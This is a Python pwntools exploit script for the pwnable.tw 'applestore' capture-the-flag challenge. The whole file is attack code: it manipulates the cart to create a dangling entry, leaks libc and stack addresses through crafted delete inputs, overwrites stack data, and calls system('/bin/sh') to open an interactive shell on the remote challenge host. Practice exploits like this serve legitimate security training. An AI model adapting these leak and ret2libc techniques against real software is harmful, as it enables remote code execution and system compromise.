from pwn import *
context.log_level="debug"
conn=process("./applestore")
conn=remote("chall.pwnable.tw",10104)
elf=ELF("./applestore")
libc=ELF("./bc.so.6")

def add(index):
	conn.sendlineafter("> ","2")
	conn.sendlineafter("Device Number> ",str(index))

def delete(payload):
	conn.sendlineafter("> ","3")
	conn.sendlineafter("Item Number> ",payload)

def checkout():
	conn.sendlineafter("> ","5")
	conn.sendlineafter("Let me check your cart. ok? (y/n) > ","y")
	conn.recvuntil("Want to checkout? Maybe next time!\n")

# 299 * 20 + 199*6 == 7174
for i in range(20):
	add(2)

for i in range(6):
	add(1)

checkout()


for i in range(26):
	delete("1")

# leak libc address
delete("1\x00"+p32(elf.got["atoi"]))
conn.recvuntil("Remove 1:")
libc_address=u32(conn.recv(4))-libc.symbols["atoi"]


# leak stack address
delete("1\x00"+p32(0x0804B070))
conn.recvuntil("Remove 1:")
handler_stack_ebp=u32(conn.recv(4))+0x60
nptr_address=handler_stack_ebp-0x22



payload="3\x00\x00\x00"+p32(0xffffffff)+p32(libc_address+libc.symbols["system"])+p32(0xffffffff)+p32(libc_address+next(libc.search("/bin/sh")))
conn.sendlineafter("> ",payload)
payload="1\x00"+p32(0x08049013)+p32(1)+p32(handler_stack_ebp-12)+p32(nptr_address+4)

log.debug("stack address is :%s"%hex(handler_stack_ebp))
log.debug("libc address is :%s"%hex(libc_address))
log.debug("system address is :%s"%hex(libc_address+libc.symbols["system"]))
log.debug("nptr address is %s"%hex(nptr_address))

conn.sendlineafter("Item Number> ",payload)
conn.sendlineafter("> ","6")
conn.interactive()












